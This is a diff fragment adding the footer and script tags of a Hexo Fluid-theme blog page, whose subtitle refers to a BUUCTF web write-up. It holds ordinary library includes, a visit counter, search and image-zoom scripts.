+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
+
+
+  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  <!-- cnzz Analytics -->
+  
+
+
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "BUUCTF WEB wp2&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
